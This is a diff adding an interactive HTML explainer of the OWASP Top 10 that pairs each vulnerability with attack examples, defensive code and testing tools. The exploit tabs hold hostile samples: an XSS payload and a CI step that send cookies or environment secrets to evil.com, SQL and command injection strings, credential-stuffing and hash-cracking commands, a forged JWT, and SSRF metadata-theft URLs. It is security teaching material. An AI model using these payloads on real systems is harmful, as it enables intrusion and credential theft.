@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OWASP Top 10 — Interactive Explorer</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: system-ui, -apple-system, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; min-height: 100vh; }
+  h1 { color: #f0883e; font-size: 1.4rem; margin-bottom: 4px; }
+  .subtitle { color: #8b949e; font-size: 0.85rem; margin-bottom: 24px; }
+
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 10px; margin-bottom: 24px; }
+  .vuln-card {
+    background: #161b22;
+    border: 2px solid #30363d;
+    border-radius: 10px;
+    padding: 14px 10px;
+    cursor: pointer;
+    text-align: center;
+    transition: all 0.2s;
+    user-select: none;
+  }
+  .vuln-card:hover { border-color: #f0883e; transform: translateY(-2px); }
+  .vuln-card.active { border-color: #f0883e; background: #1c1407; }
+  .vuln-id { font-size: 0.7rem; color: #8b949e; margin-bottom: 4px; letter-spacing: 1px; }
+  .vuln-name { font-size: 0.85rem; font-weight: 600; color: #e6edf3; }
+  .vuln-emoji { font-size: 1.6rem; margin-bottom: 6px; display: block; }
+  .severity-dot {
+    display: inline-block;
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    margin-right: 4px;
+    vertical-align: middle;
+  }
+
+  .detail-panel {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 12px;
+    padding: 24px;
+    display: none;
+  }
+  .detail-panel.visible { display: block; }
+  .detail-header { display: flex; align-items: center; gap: 14px; margin-bottom: 16px; }
+  .detail-emoji { font-size: 2.5rem; }
+  .detail-title h2 { color: #f0883e; font-size: 1.2rem; }
+  .detail-title .detail-id { color: #8b949e; font-size: 0.8rem; }
+  .severity-badge {
+    display: inline-block;
+    padding: 2px 10px;
+    border-radius: 20px;
+    font-size: 0.75rem;
+    font-weight: 600;
+    margin-left: 8px;
+  }
+  .critical { background: #4c1010; color: #f85149; border: 1px solid #f85149; }
+  .high     { background: #3d1f00; color: #f0883e; border: 1px solid #f0883e; }
+  .medium   { background: #2d2600; color: #e3b341; border: 1px solid #e3b341; }
+
+  .tabs-inner { display: flex; gap: 6px; margin-bottom: 14px; }
+  .tab-inner-btn {
+    background: #0d1117;
+    border: 1px solid #30363d;
+    color: #8b949e;
+    padding: 6px 14px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 0.82rem;
+    font-family: inherit;
+    transition: all 0.15s;
+  }
+  .tab-inner-btn.active { background: #f0883e; color: #0d1117; border-color: #f0883e; font-weight: 600; }
+  .tab-inner-content { display: none; }
+  .tab-inner-content.active { display: block; }
+
+  p.desc { color: #8b949e; font-size: 0.88rem; line-height: 1.7; margin-bottom: 12px; }
+  code, pre { font-family: 'Courier New', monospace; }
+  pre {
+    background: #0d1117;
+    border: 1px solid #30363d;
+    border-radius: 6px;
+    padding: 14px;
+    font-size: 0.78rem;
+    overflow-x: auto;
+    white-space: pre;
+    line-height: 1.6;
+  }
+  pre.attack { border-left: 3px solid #f85149; color: #ffa198; }
+  pre.defence { border-left: 3px solid #3fb950; color: #7ee787; }
+  .label { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+  .label.attack { color: #f85149; }
+  .label.defence { color: #3fb950; }
+  .tools-row { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
+  .tool-pill {
+    background: #0d2a1a;
+    border: 1px solid #3fb950;
+    color: #7ee787;
+    padding: 3px 10px;
+    border-radius: 20px;
+    font-size: 0.75rem;
+  }
+  .empty-state {
+    text-align: center;
+    color: #8b949e;
+    padding: 40px 20px;
+    font-size: 0.9rem;
+  }
+  .empty-state span { font-size: 2rem; display: block; margin-bottom: 10px; }
+</style>
+</head>
+<body>
+<h1>&#x1F512; OWASP Top 10 — Interactive Security Explorer</h1>
+<p class="subtitle">Click a vulnerability to explore exploit technique, defence, and testing tools.</p>
+
+<div class="grid" id="vuln-grid"></div>
+
+<div class="detail-panel" id="detail-panel">
+  <div class="detail-header">
+    <div class="detail-emoji" id="d-emoji"></div>
+    <div class="detail-title">
+      <h2 id="d-name"></h2>
+      <span class="detail-id" id="d-id"></span>
+      <span class="severity-badge" id="d-sev"></span>
+    </div>
+  </div>
+  <div class="tabs-inner">
+    <button class="tab-inner-btn active" onclick="innerTab('overview')">Overview</button>
+    <button class="tab-inner-btn" onclick="innerTab('exploit')">Exploit</button>
+    <button class="tab-inner-btn" onclick="innerTab('defence')">Defence</button>
+    <button class="tab-inner-btn" onclick="innerTab('tools')">Tools</button>
+  </div>
+  <div class="tab-inner-content active" id="ti-overview"><p class="desc" id="d-desc"></p></div>
+  <div class="tab-inner-content" id="ti-exploit">
+    <div class="label attack">Attack Technique</div>
+    <pre class="attack" id="d-exploit"></pre>
+  </div>
+  <div class="tab-inner-content" id="ti-defence">
+    <div class="label defence">Defensive Code / Config</div>
+    <pre class="defence" id="d-defence"></pre>
+  </div>
+  <div class="tab-inner-content" id="ti-tools">
+    <p class="desc" id="d-tools-desc"></p>
+    <div class="tools-row" id="d-tools"></div>
+  </div>
+</div>
+
+<script>
+const vulns = [
+  {
+    id: "A01", name: "Broken Access Control", emoji: "🔓", sev: "critical",
+    desc: "A01 is the most widespread OWASP category. The application fails to enforce restrictions on what authenticated users are permitted to do. Attackers can exploit flaws to access unauthorised data or functionality. This includes IDOR, forced browsing, privilege escalation, and CORS misconfiguration.",
+    exploit: `# IDOR — Increment the order ID to access other users' orders
+GET /api/orders/1000 HTTP/1.1   # Your order — 200 OK
+GET /api/orders/999  HTTP/1.1   # Another user's order — should be 403
+
+# Forced browsing — access admin panel without being admin
+GET /admin/users HTTP/1.1
+Authorization: Bearer <regular_user_token>
+
+# Mass assignment — send privileged fields in request body
+POST /api/users/update HTTP/1.1
+{"name": "Alice", "role": "admin", "isVerified": true}`,
+    defence: `# Python/FastAPI — always verify object ownership
+@router.get("/orders/{order_id}")
+async def get_order(order_id: int, current_user: User = Depends(get_current_user)):
+    order = await db.get(Order, order_id)
+    if not order or order.user_id != current_user.id:
+        raise HTTPException(status_code=403, detail="Forbidden")
+    return order
+
+# Deny by default: block all routes, then explicitly allow
+# Never trust client-supplied role or privilege fields
+# Log all 403 responses and alert on spikes`,
+    toolsDesc: "Key tools for discovering broken access control vulnerabilities:",
+    tools: ["Burp Intruder", "Burp Repeater", "Autorize (Burp Plugin)", "Postman Collection Runner"]
+  },
+  {
+    id: "A02", name: "Cryptographic Failures", emoji: "🔑", sev: "high",
+    desc: "Previously called 'Sensitive Data Exposure', this category covers failures in cryptography that lead to exposure of sensitive data. Common issues: MD5/SHA1 for passwords, HTTP instead of HTTPS, weak TLS cipher suites, hardcoded keys in source code, and unencrypted storage of PII.",
+    exploit: `# Capture MD5 hash from a leaked/dumped database
+admin:5f4dcc3b5aa765d61d8327deb882cf99  # MD5 of 'password'
+
+# Crack instantly with hashcat
+hashcat -m 0 -a 0 hash.txt rockyou.txt
+# Cracks in < 1 second
+
+# Man-in-the-middle on HTTP (no HTTPS)
+# Capture cleartext credentials with Wireshark or Bettercap
+bettercap -iface eth0
+> net.sniff.on
+> net.probe.on
+# Login credentials appear in plaintext in network traffic`,
+    defence: `# Safe password hashing — bcrypt with cost factor 12
+import bcrypt
+
+def hash_password(password: str) -> str:
+    salt = bcrypt.gensalt(rounds=12)
+    return bcrypt.hashpw(password.encode(), salt).decode()
+
+def verify_password(password: str, hashed: str) -> bool:
+    return bcrypt.checkpw(password.encode(), hashed.encode())
+
+# Enforce HTTPS with HSTS header
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+
+# TLS configuration (nginx)
+ssl_protocols TLSv1.2 TLSv1.3;
+ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305;
+ssl_prefer_server_ciphers on;`,
+    toolsDesc: "Tools for testing cryptographic implementations:",
+    tools: ["testssl.sh", "ssllabs.com", "Wireshark", "Hashcat", "John the Ripper"]
+  },
+  {
+    id: "A03", name: "Injection", emoji: "💉", sev: "critical",
+    desc: "Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. SQL, NoSQL, OS command, LDAP, and XSS (HTML injection) all share this root cause. An attacker can use injection to read/modify data, execute OS commands, or bypass authentication.",
+    exploit: `# SQL Injection — authentication bypass
+Username: admin'--
+Password: anything
+# Query becomes: SELECT * FROM users WHERE user='admin'--' AND pass='...'
+
+# UNION-based data exfiltration
+' UNION SELECT username,password,NULL FROM users--
+
+# OS command injection (Python os.system)
+# Input: 8.8.8.8; cat /etc/passwd
+output = os.system("ping " + user_input)
+# Executes: ping 8.8.8.8; cat /etc/passwd
+
+# XSS — stored script injection
+<script>document.location='http://evil.com/?c='+document.cookie</script>`,
+    defence: `# Parameterised queries — the primary fix for SQLi
+# Python (sqlite3 / psycopg2)
+cursor.execute(
+    "SELECT * FROM users WHERE username = ? AND password = ?",
+    (username, hashed_password)
+)
+
+# ORM parameterises automatically (SQLAlchemy)
+stmt = select(User).where(User.username == username)
+result = await db.execute(stmt)
+
+# OS command injection — never use shell=True
+# BAD:  os.system("ping " + host)
+# GOOD:
+subprocess.run(["ping", "-c", "4", host], capture_output=True)
+
+# XSS — output encoding (Jinja2 auto-escapes by default)
+{{ user_input | e }}  {# Jinja2 HTML escape #}
+# CSP header: Content-Security-Policy: default-src 'self'`,
+    toolsDesc: "Testing and detection tools for injection vulnerabilities:",
+    tools: ["SQLMap", "OWASP ZAP", "Burp Scanner", "Semgrep", "Bandit (Python)"]
+  },
+  {
+    id: "A04", name: "Insecure Design", emoji: "🏗️", sev: "high",
+    desc: "A new category in 2021, Insecure Design covers missing or ineffective security controls in the application architecture. Unlike A05 (misconfiguration), this is not an implementation bug — the design itself is flawed. Cannot be patched; must be redesigned. Includes missing rate limits, insecure password reset flows, and absent abuse-case modelling.",
+    exploit: `# Abusing insecure password reset — secret questions
+# Guess: "What was your first pet?" = "Fluffy"
+# No lockout + guessable answers = account takeover
+
+# Abusing missing rate limits on discount codes
+for i in range(1, 9999):
+    response = requests.post('/checkout',
+        json={"code": f"PROMO{i:04d}"}
+    )
+    if response.json().get("discount") > 0:
+        print(f"Valid code: PROMO{i:04d}")
+        break
+
+# Abusing lack of transaction limits
+# Make 1000 small transfers of £0.01 to drain account
+# No daily limit, no velocity check`,
+    defence: `# Rate limiting with slowapi (FastAPI)
+from slowapi import Limiter
+limiter = Limiter(key_func=get_remote_address)
+
+@app.post("/login")
+@limiter.limit("5/minute")
+async def login(request: Request, ...):
+    ...
+
+# Secure password reset — time-limited tokens
+import secrets, time
+token = secrets.token_urlsafe(32)
+expiry = time.time() + 900  # 15 minutes
+redis.setex(f"reset:{token}", 900, user_id)
+
+# Never use secret questions
+# Use time-based OTP (TOTP) for 2FA instead`,
+    toolsDesc: "Threat modelling and design review tools:",
+    tools: ["OWASP Threat Dragon", "Microsoft Threat Modeling Tool", "Manual Design Review", "Attack Trees"]
+  },
+  {
+    id: "A05", name: "Security Misconfiguration", emoji: "⚙️", sev: "medium",
+    desc: "Security misconfiguration is the most commonly found issue. It includes default credentials, unnecessary features enabled, verbose error messages, missing security headers, open cloud storage, and permissive CORS. Automated hardening and configuration management reduce this category significantly.",
+    exploit: `# Default credentials
+admin:admin, admin:password, root:root
+
+# Verbose error messages reveal stack traces
+GET /api/users?id=abc
+500 Internal Server Error
+File "app/routes.py", line 42, in get_user
+  cursor.execute("SELECT * FROM users WHERE id=" + id)
+# Reveals: file path, code, DB query structure
+
+# Permissive CORS — accepts any origin
+curl -H "Origin: https://evil.com" https://api.target.com/profile
+Access-Control-Allow-Origin: *   # All origins accepted
+
+# Open S3 bucket
+aws s3 ls s3://target-company-backup --no-sign-request`,
+    defence: `# Security headers (nginx)
+add_header Content-Security-Policy "default-src 'self'" always;
+add_header X-Frame-Options "DENY" always;
+add_header X-Content-Type-Options "nosniff" always;
+add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+
+# Disable debug mode in production (FastAPI)
+app = FastAPI(debug=False)
+# Or via environment: FASTAPI_ENV=production
+
+# Restrict CORS to known origins
+from fastapi.middleware.cors import CORSMiddleware
+app.add_middleware(CORSMiddleware,
+    allow_origins=["https://app.company.com"],
+    allow_credentials=True,
+    allow_methods=["GET", "POST"]
+)`,
+    toolsDesc: "Scanning for misconfiguration:",
+    tools: ["Nikto", "Mozilla Observatory", "SecurityHeaders.com", "ScoutSuite", "Prowler"]
+  },
+  {
+    id: "A07", name: "Auth Failures", emoji: "🔐", sev: "critical",
+    desc: "Broken Authentication (now 'Identification and Authentication Failures') covers weaknesses in authentication mechanisms: weak passwords, missing MFA, insecure session management, credential stuffing, and poor logout. Session tokens must be invalidated after logout and rotate after authentication.",
+    exploit: `# Credential stuffing with a leaked database
+# 8.4 billion credentials from RockYou2021
+hydra -L emails.txt -P passwords.txt target.com http-post-form \
+  "/login:email=^USER^&password=^PASS^:Invalid credentials"
+
+# Session fixation — attacker sets session ID before login
+GET /login?session=ATTACKER_SESSION_ID
+# If app keeps same session ID after login, attacker is authenticated
+
+# Weak JWT secret brute-force
+hashcat -m 16500 -a 0 token.txt rockyou.txt`,
+    defence: `# MFA with TOTP (pyotp)
+import pyotp
+totp = pyotp.TOTP(user.totp_secret)
+if not totp.verify(request.totp_code):
+    raise HTTPException(403, "Invalid MFA code")
+
+# Rate limit login attempts
+@limiter.limit("5/minute;20/hour")
+async def login(): ...
+
+# Rotate session after login (anti-fixation)
+session.regenerate_id()
+
+# Short-lived JWTs with refresh token rotation
+ACCESS_TOKEN_EXPIRE_MINUTES = 15
+REFRESH_TOKEN_EXPIRE_DAYS = 7  # Rotate on use`,
+    toolsDesc: "Authentication testing tools:",
+    tools: ["Hydra", "Burp Intruder", "jwt.io", "hashcat", "CrackMapExec"]
+  },
+  {
+    id: "A10", name: "SSRF", emoji: "🌐", sev: "critical",
+    desc: "Server-Side Request Forgery (SSRF) allows attackers to induce the server to make requests to arbitrary locations. The most severe impact: reaching the AWS Instance Metadata Service (169.254.169.254) to steal IAM credentials, enabling full cloud account takeover. Added to OWASP Top 10 in 2021 due to its frequency and severity.",
+    exploit: `# Basic SSRF — reach internal metadata service
+GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+
+# Response reveals IAM credentials:
+# http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "...",
+  "Expiration": "2024-12-31T00:00:00Z"
+}
+
+# Filter bypass techniques
+http://2130706433/   # 127.0.0.1 in decimal
+http://0x7f000001/   # 127.0.0.1 in hex
+http://[::1]/        # IPv6 loopback
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/  # Unicode bypass`,
+    defence: `# Allowlist permitted domains
+ALLOWED_FETCH_DOMAINS = {"api.partner.com", "cdn.company.com"}
+
+import urllib.parse, ipaddress
+
+def safe_fetch(url: str) -> bytes:
+    parsed = urllib.parse.urlparse(url)
+    if parsed.hostname not in ALLOWED_FETCH_DOMAINS:
+        raise ValueError("Domain not in allowlist")
+    # Resolve and block private IPs
+    try:
+        ip = ipaddress.ip_address(
+            socket.gethostbyname(parsed.hostname)
+        )
+        if ip.is_private or ip.is_loopback:
+            raise ValueError("Private IP blocked")
+    except ValueError:
+        raise
+    return requests.get(url, timeout=5).content
+
+# AWS: Use IMDSv2 (requires PUT token — harder to SSRF)
+# ec2-metadata-service-endpoint-type = IPv4 with hop limit = 1`,
+    toolsDesc: "SSRF detection and exploitation tools:",
+    tools: ["Burp Collaborator", "interactsh", "SSRFmap", "OWASP ZAP", "Manual Testing"]
+  },
+  {
+    id: "A08", name: "Software Integrity", emoji: "📦", sev: "medium",
+    desc: "Software and Data Integrity Failures relate to code and infrastructure that do not protect against integrity violations. This includes using unverified packages, auto-updating from untrusted sources, and insecure CI/CD pipelines. The SolarWinds and Codecov attacks are prominent examples.",
+    exploit: `# Supply chain attack via malicious npm package
+# Attacker publishes: event-stream@3.3.6 with backdoor
+npm install event-stream   # Installs malicious version
+
+# Compromised CI/CD — inject malicious step
+# If CI config is in a PR from external contributor:
+# .github/workflows/ci.yml — add step to exfiltrate secrets
+- name: Build
+  run: |
+    curl -d "$(env)" https://evil.com/steal
+
+# Insecure deserialisation (Python pickle)
+import pickle
+data = pickle.loads(user_supplied_bytes)  # Executes arbitrary code`,
+    defence: `# Lock dependencies with exact versions
+# package-lock.json (npm) / poetry.lock (Python)
+# Never use: "requests": "^2.0"  →  use "requests": "2.31.0"
+
+# Verify package integrity (npm)
+npm ci  # Uses lockfile; fails if hashes mismatch
+
+# Python — hash pinning in requirements.txt
+requests==2.31.0 \
+  --hash=sha256:58cd2187...
+
+# Signed commits for CI pipeline changes
+git config --global commit.gpgsign true
+
+# Never deserialize untrusted data with pickle
+# Use json.loads() instead`,
+    toolsDesc: "Software composition analysis tools:",
+    tools: ["Dependabot", "Snyk", "OWASP Dependency-Check", "Trivy", "Socket.dev"]
+  },
+  {
+    id: "API1", name: "BOLA / IDOR", emoji: "🆔", sev: "critical",
+    desc: "Broken Object Level Authorization (BOLA) is the #1 API security risk. The API does not verify that the authenticated user owns or is authorized to access the specific object referenced by an ID in the request. This is the API-specific version of IDOR.",
+    exploit: `# BOLA — access other user's data by changing the ID
+# Logged in as User 1001:
+GET /api/v1/invoices/5500 HTTP/1.1
+Authorization: Bearer <user_1001_token>
+
+# Change invoice ID:
+GET /api/v1/invoices/5499 HTTP/1.1
+Authorization: Bearer <user_1001_token>
+# 200 OK — returns User 1000's invoice!
+
+# Systematic BOLA discovery with Burp Intruder
+# Mark: /api/invoices/§5500§
+# Payload: numbers 5400-5600
+# Filter: response length != 404 length`,
+    defence: `# Always verify object ownership before returning data
+async def get_invoice(invoice_id: int, user: User = Depends(auth)):
+    invoice = await db.scalar(
+        select(Invoice).where(Invoice.id == invoice_id)
+    )
+    if not invoice:
+        raise HTTPException(404)
+    # THIS IS THE CRITICAL CHECK:
+    if invoice.user_id != user.id:
+        raise HTTPException(403, "Access denied")
+    return invoice
+
+# Use UUIDs instead of sequential integers
+# Harder to enumerate but NOT a substitute for authz:
+invoice_id = uuid.uuid4()  # Still needs the ownership check!`,
+    toolsDesc: "BOLA/IDOR detection tools and techniques:",
+    tools: ["Burp Intruder", "Autorize", "Postman Runner", "Manual (2 accounts)"]
+  },
+  {
+    id: "API2", name: "JWT / Auth", emoji: "🎟️", sev: "critical",
+    desc: "Broken Authentication in APIs includes weak JWT implementations (weak secrets, no expiry, alg:none), missing token rotation, OAuth misconfiguration, and insecure API key handling. JWT attacks can allow an attacker to forge tokens and impersonate any user including admins.",
+    exploit: `# JWT alg:none attack — forge token with no signature
+# 1. Decode original header: {"alg":"RS256","typ":"JWT"}
+# 2. Modify: {"alg":"none","typ":"JWT"}
+# 3. Modify payload: {"sub":"1","role":"admin"}
+# 4. Base64URL encode both, join with "." and empty sig:
+
+TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
+curl -H "Authorization: Bearer $TOKEN" https://api.target.com/admin
+
+# Secret brute-force (HS256)
+hashcat -m 16500 -a 0 token.txt rockyou.txt
+# If secret is weak (e.g., "secret"), cracks instantly`,
+    defence: `# Strict JWT validation (PyJWT)
+import jwt
+
+def decode_token(token: str) -> dict:
+    return jwt.decode(
+        token,
+        settings.SECRET_KEY,
+        algorithms=["HS256"],   # Explicitly whitelist ONE algorithm
+        options={
+            "require": ["exp", "iat", "sub"],
+            "verify_exp": True
+        },
+        audience="myapp",
+        issuer="auth.myapp.com"
+    )
+    # Never pass algorithms=None or accept alg from token header
+
+# Use RS256 with asymmetric keys for public APIs
+# Short expiry: ACCESS_TOKEN_EXPIRE_MINUTES = 15`,
+    toolsDesc: "JWT attack and analysis tools:",
+    tools: ["jwt.io", "jwt_tool", "hashcat -m 16500", "Burp JWT Editor", "jose-util"]
+  }
+];
+
+let activeIdx = null;
+let activeInnerTab = 'overview';
+
+const sevConfig = {
+  critical: { label: 'Critical', cls: 'critical' },
+  high:     { label: 'High',     cls: 'high'     },
+  medium:   { label: 'Medium',   cls: 'medium'   }
+};
+
+function renderGrid() {
+  document.getElementById('vuln-grid').innerHTML = vulns.map((v, i) => `
+    <div class="vuln-card ${activeIdx === i ? 'active' : ''}" onclick="showDetail(${i})">
+      <span class="vuln-emoji">${v.emoji}</span>
+      <div class="vuln-id">${v.id}</div>
+      <div class="vuln-name">${v.name}</div>
+    </div>
+  `).join('');
+}
+
+function showDetail(idx) {
+  activeIdx = idx;
+  const v = vulns[idx];
+  const sc = sevConfig[v.sev];
+  document.getElementById('d-emoji').textContent = v.emoji;
+  document.getElementById('d-name').textContent = v.name;
+  document.getElementById('d-id').textContent = v.id;
+  const sev = document.getElementById('d-sev');
+  sev.textContent = sc.label;
+  sev.className = 'severity-badge ' + sc.cls;
+  document.getElementById('d-desc').textContent = v.desc;
+  document.getElementById('d-exploit').textContent = v.exploit;
+  document.getElementById('d-defence').textContent = v.defence;
+  document.getElementById('d-tools-desc').textContent = v.toolsDesc;
+  document.getElementById('d-tools').innerHTML = v.tools.map(t => `<span class="tool-pill">${t}</span>`).join('');
+  document.getElementById('detail-panel').classList.add('visible');
+  innerTab('overview');
+  renderGrid();
+  setTimeout(() => document.getElementById('detail-panel').scrollIntoView({ behavior: 'smooth', block: 'nearest' }), 50);
+}
+
+function innerTab(name) {
+  activeInnerTab = name;
+  document.querySelectorAll('.tab-inner-btn').forEach(b => {
+    b.classList.toggle('active', b.textContent.toLowerCase() === name);
+  });
+  document.querySelectorAll('.tab-inner-content').forEach(c => {
+    c.classList.toggle('active', c.id === 'ti-' + name);
+  });
+}
+
+// Init
+renderGrid();
+</script>
+</body>
+</html>
